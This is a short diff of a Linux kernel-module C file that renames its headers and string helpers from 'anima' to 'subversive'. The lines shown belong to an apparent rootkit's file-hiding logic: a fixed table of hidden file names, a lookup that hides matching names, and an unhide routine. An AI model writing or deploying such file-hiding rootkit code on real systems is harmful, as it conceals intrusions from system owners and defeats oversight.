@@ -1,9 +1,9 @@
 #include <linux/kernel.h>
 
-#include <anima/arch.h>
-#include <anima/ksyms.h>
-#include <anima/libc.h>
-#include <anima/vfs.h>
+#include <subversive/arch.h>
+#include <subversive/ksyms.h>
+#include <subversive/libc.h>
+#include <subversive/vfs.h>
 
 #define MAX_HIDDEN_FILES 50
 #define FILENAME_SIZE	 50
@@ -13,7 +13,7 @@ static char hidden_file[MAX_HIDDEN_FILES][FILENAME_SIZE] = { {0} };
 static int is_name_hidden(const char *name)
 {
 	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
-		if (hidden_file[i][0] && !anima_strcmp(hidden_file[i], name)) {
+		if (hidden_file[i][0] && !subversive_strcmp(hidden_file[i], name)) {
 			pr_debug("%s: hiding %s\n", __func__, name);
 			return 1;
 		}
@@ -94,7 +94,7 @@ int vfs_unhide_filename(const char *name, unsigned int len)
 	pr_debug("%s: name=%s\n", __func__, kname);
 
 	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
-		if (!anima_strcmp(hidden_file[i], kname)) {
+		if (!subversive_strcmp(hidden_file[i], kname)) {
 			hidden_file[i][0] = 0;
 			pr_debug("hidden\n");
 		}
